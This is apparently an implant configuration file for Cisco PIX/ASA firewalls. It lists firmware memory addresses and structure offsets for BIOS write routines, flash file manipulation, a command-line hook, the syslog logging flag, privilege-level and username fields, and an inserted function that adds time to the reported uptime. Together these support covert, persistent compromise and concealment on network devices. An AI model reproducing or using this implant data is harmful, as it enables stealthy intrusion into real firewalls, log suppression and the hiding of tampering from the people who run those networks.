; --- SECTION I ---
;
0x10080306            // pix version
0x6f6000              // address of implant configuration
CryptoDeviceAddr          0x015b5a40      // addr of crypto structure
ArpTableAddrPtr           0x013f47f8      // addr of first entry in ARP table
NumInterfaces             0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2              0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len           0x00            // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr             0x015c22b0      // addr of the bios class structure
BiosWriteAddr1            0x004dd828      // addr of the bios write function for one specific bios
BiosWriteAddr2            0x004e0748      // addr of the bios write function for one specific bios
BiosWriteAddr3            0x004e0068      // addr of the bios write function for one specific bios
BiosWriteAddr4            0x004e1198      // addr of the bios write function for one specific bios
BiosWriteOffset           0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress         0x005c1250      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress      0x013c6aa7      // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress      0x004cbf98      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress     0x013c671a      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress     0x004cbc78      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress       0x005c0890      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress       0x005c1540      // ifs_get_size; get the size of the provided open file
FlashChmodAddress         0x005c0d80      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress      0x005c0f00      // ifs_rename; move a file
FlashGetFileInfoAddress   0x00000000      // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress      0x005c2480      // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset   0x0000002c      // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr     0x0127af20      // The address of a function that returns the platform string 
ASARestatFlashFlagAddr    0x01626930      // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc              0x0011a4d0      // addr of the device announce function
DevIoctlOffset            0x70            // offset to ioctl function in device table
DuartTtyAddr              0x01349da8      // addr of duart/0 tty entry
CIStartFunc               0x00189600      // addr of the command interface start function -- telnet function
CommandListAddr           0x0142a890      // addr of the command list -- first parameter of ci
DeviceListPtrAddr         0x014eec60      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset       0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr            0x012853e0      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr         0x01720768      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue               0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue              0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue               0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset               0x84            // Offset into a thread struct containing the stdch pointer
StdErrOffset              0x88            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset            0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset               0x14            // offset into an environment struct containing the username 
EnvPtrOffset              0x90            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset              0x00000b18      // offset into the syslog structure where the logging level is stored
Open                      0x0011a750      // open
ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
InputModeOffset           0x08            // offset into a duart config structure where the input mode is stored
InputModeEsc              0x20            // Input mode used for entering escape sequence
WatchDogTimeout           0x0131705c      // Address where the thread timeout value is stored 
UpTimeCounter             0x015af480      // Address of the up time counter
Display_uptime_addr       0x001944b0      // Address of the function that display the uptime
Inserted_code_addr        0x001a8eb4      // Address of the our insterted function to add time to the uptime
i2cReadByte               0x01166e38      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte              0x01166c88      // write byte function needed to operate on the bios of the asa 5505
CLIHookAddress            0x00189aba      // Address of hook into the command interface
AvailMemoryPtr            0x015b0380      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
